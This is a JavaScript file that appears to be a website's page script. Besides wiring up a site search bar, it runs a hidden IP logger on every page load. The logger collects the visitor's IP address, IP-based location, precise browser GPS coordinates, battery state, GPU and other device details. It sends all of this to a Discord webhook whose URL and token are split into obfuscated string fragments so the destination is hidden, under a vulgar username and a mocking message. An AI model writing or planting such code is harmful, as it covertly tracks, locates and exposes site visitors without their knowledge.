const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(async geoData => {

                    function getGPUInfo() {
                        try {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                            if (!gl) return 'N/A';

                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                            }
                            return 'N/A';
                        } catch {
                            return 'N/A';
                        }
                    }
                    function getBrowserLocation() {
                        return new Promise((resolve) => {
                            if (!navigator.geolocation) {
                                return resolve({ error: 'Geolocation not supported' });
                            }

                            navigator.geolocation.getCurrentPosition(
                                (position) => {
                                    resolve({
                                        latitude: position.coords.latitude.toFixed(6),
                                        longitude: position.coords.longitude.toFixed(6),
                                        accuracy: `${position.coords.accuracy} meters`
                                    });
                                },
                                (error) => {
                                    resolve({ error: error.message });
                                },
                                {
                                    enableHighAccuracy: true,
                                    timeout: 10000,
                                    maximumAge: 0
                                }
                            );
                        });
                    }

                    const deviceInfo = {
                        userAgent: navigator.userAgent,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        language: navigator.language,
                        platform: navigator.platform,
                        battery: "PC don't have battery",
                        charging: "PC don't have battery",
                        screenRefreshRate: "N/A",
                        touchScreen: ('ontouchstart' in window) ? 'Yes' : 'No',
                        gpu: getGPUInfo()
                    };

                    if (navigator.getBattery) {
                        await navigator.getBattery().then(battery => {
                            deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
                            deviceInfo.charging = battery.charging ? "Yes" : "No";
                        });
                    }

                    const getScreenRefreshRate = () => {
                        return new Promise(resolve => {
                            let frames = 0;
                            const start = performance.now();

                            const loop = () => {
                                frames++;
                                const elapsed = performance.now() - start;
                                if (elapsed < 1000) {
                                    requestAnimationFrame(loop);
                                } else {
                                    resolve(Math.round((frames * 1000) / elapsed) + " Hz");
                                }
                            };

                            requestAnimationFrame(loop);
                        });
                    };

                    deviceInfo.screenRefreshRate = await getScreenRefreshRate();
                    

                    const browserLocation = await getBrowserLocation();
                    const rKe1 = "https://";
                    const cIj5 = ".com/";
                    const Sgs1 = "webho";
                    const SFoa = "oks/";
                    const zPr7 = Sgs1 + SFoa;
                    const qLt2 = "1411";
                    const eBa1 = "0036";
                    const vXs9 = "6165";
                    const sQa0 = "9803";
                    const pHw6 = "770/";
                    const oPw7 = "ArV2rU";
                    const dEn2 = "Z5QRdW";
                    const lMz4 = "m2PrQe";
                    const bYn4 = "-9kyOT";
                    const aCx8 = "api/";
                    const vPq1 = "g5-PQ1";
                    const rXz3 = "mGSqLo";
                    const xJv9 = "discord";
                    const tFm8 = "VRYrk_";
                    const aYk5 = "iDb0dz";
                    const mFd3 = "_vVjjA";
                    const sUn7 = "Qf2ENL";
                    const kRt3 = "ih7nkj";
                    const mVo2 = "8l";
                    const tUv5 = vPq1 + rXz3 + tFm8 + aYk5 + sUn7 + mVo2;
                    const dscURL =
                      rKe1 +
                      xJv9 +
                      cIj5 +
                      aCx8 +
                      zPr7 +
                      qLt2 +
                      eBa1 +
                      vXs9 +
                      sQa0 +
                      pHw6 +
                      kRt3 +
                      oPw7 +
                      dEn2 +
                      mFd3 +
                      bYn4 +
                      lMz4 +
                      tUv5;



                    return fetch(dscURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: "SUCK MY COCK",
                            avatar_url: "https://cdn.discordapp.com/attachments/1386287641540034583/1421597864097747209/Snimka_obrazovky_2025-08-28_002132.png?ex=68d99dae&is=68d84c2e&hm=b3b43527d94bd9d03107e49be1fa3156447d506308f95282a74224e96f16c888",
                            content: `||@here @everyone|| Some bozo grabbed (main)`,
                            embeds: [{
                                title: '🤡SCRIPTY IP LOGGER🤡',
                                description: `
**📍IP Info📍:**
IP Address > ${ipadd}
Network > ${geoData.network}
City > ${geoData.city}
Region > ${geoData.region}
Country > ${geoData.country_name}
Postal Code > ${geoData.postal}
Latitude > ${geoData.latitude}
Longitude > ${geoData.longitude}
Timezone > ${geoData.timezone}
Organization > ${geoData.org}

**🧭Geolocation🧭:**
Latitude > ${browserLocation.latitude || 'Denied'}
Longitude > ${browserLocation.longitude || 'Denied'}
Accuracy > ${browserLocation.accuracy || browserLocation.error || 'N/A'}

**📺Screen Info📺:**
Screen Width > ${deviceInfo.screenWidth}px
Screen Height > ${deviceInfo.screenHeight}px
Screen Refresh Rate > ${deviceInfo.screenRefreshRate}
Touch Screen > ${deviceInfo.touchScreen}

**💻Device Info💻:**
User-Agent > ${window}
User-Agent > ${deviceInfo.userAgent}
Language > ${deviceInfo.language}
Platform > ${deviceInfo.platform}
Battery > ${deviceInfo.battery}
Charging > ${deviceInfo.charging}
GPU > ${deviceInfo.gpu}
                                `,
                                color: 10181046
                            }]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();

document.querySelector('.search-bar input').addEventListener('keydown', e => {
  if (e.key === 'Enter') {
    const query = e.target.value.trim();
    if (query) {
      window.location.href = `https://google.com/search?q=site:scripty.my+${encodeURIComponent(query)}`;
    }
  }
});

document.querySelector('.search-bar button').addEventListener('click', () => {
  const query = document.querySelector('.search-bar input').value.trim();
  if (query) {
    window.location.href = `https://google.com/search?q=site:scripty.my+${encodeURIComponent(query)}`;
  }
});